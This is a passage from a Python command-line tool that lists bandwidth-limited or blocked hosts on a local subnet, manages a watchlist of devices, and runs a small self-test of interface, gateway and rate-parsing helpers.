                print(f"{C.DIM}No active limits/blocks.{C.RST}"); continue
            print(f"\n{C.CYN}{'ID':<4} {'IP':<16} {'Hostname':<20} {'Type':<10} {'Rate':>10} {'Dir':<10}{C.RST}")
            print("-" * 74)
            for ip, info in list(limiter._hosts.items()):
                dev = None
                for d in devices.values():
                    if d["ip"] == ip: dev = d; break
                if not dev: continue
                typ = f"{C.RED}blocked{C.RST}" if info["blocked"] else f"{C.YEL}limited{C.RST}"
                rate = info["rate"] or "-"
                d = Dir.name(info["dir"])
                print(f"{dev['id']:<4} {ip:<16} {dev['hostname'][:20]:<20} {typ:<20} {rate:>10} {d:<10}")

        elif cmd == "watch":
            sub = arg.strip()
            if not sub or sub == "status":
                hosts = watchlist.get("hosts",[])
                print(f"{C.BLD}Watch:{C.RST}")
                print(f"  Range:    {watchlist.get('range') or 'entire subnet'}")
                print(f"  Interval: {watchlist.get('interval',120)}s")
                print(f"  Hosts:    {len(hosts)}")
                for mac in hosts:
                    d = devices.get(mac,{})
                    print(f"    - {d.get('id','?')}: {d.get('ip','?')} {d.get('mac',mac)} {d.get('hostname','')}")
            elif sub.startswith("add"):
                w = sub.split(None,1)
                ids_s = w[1] if len(w) > 1 else ""
                if not ids_s:
                    print(f"{C.RED}Usage: watch add IDs{C.RST}"); continue
                for d in parse_ids(ids_s, devices):
                    if d["mac"] not in watchlist["hosts"]:
                        watchlist["hosts"].append(d["mac"])
                save(WATCH_FILE, watchlist)
                print(f"{C.GRN}Watching.{C.RST}")
            elif sub.startswith("remove"):
                w = sub.split(None,1)
                ids_s = w[1] if len(w) > 1 else ""
                if ids_s.lower() == "all":
                    watchlist["hosts"] = []
                else:
                    for d in parse_ids(ids_s, devices):
                        watchlist["hosts"] = [m for m in watchlist["hosts"] if m != d["mac"]]
                save(WATCH_FILE, watchlist)
                print(f"{C.GRN}Updated.{C.RST}")
            elif sub.startswith("set"):
                w = sub.split(None,2)
                if len(w) < 3:
                    print(f"{C.RED}Usage: watch set range|interval VALUE{C.RST}"); continue
                attr, val = w[1], w[2]
                if attr in ("range","interval"):
                    watchlist[attr] = val
                    save(WATCH_FILE, watchlist)
                    print(f"{C.GRN}Set {attr} = {val}{C.RST}")

        elif cmd == "clear":
            print("\033c", end="")

        elif cmd in ("quit","exit","q"):
            cleanup()

        else:
            print(f"{C.DIM}Unknown command. Type 'help'.{C.RST}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        assert detect_iface() is not None
        assert detect_gw() is not None
        assert parse_rate("200kbit") == "200.0kbit"
        assert parse_rate("5mbit") == "5.0mbit"
        assert parse_rate("1mbps") == "1.0mbit"
        assert parse_rate("invalid") is None
        print("selftest passed")
    else:
        main()
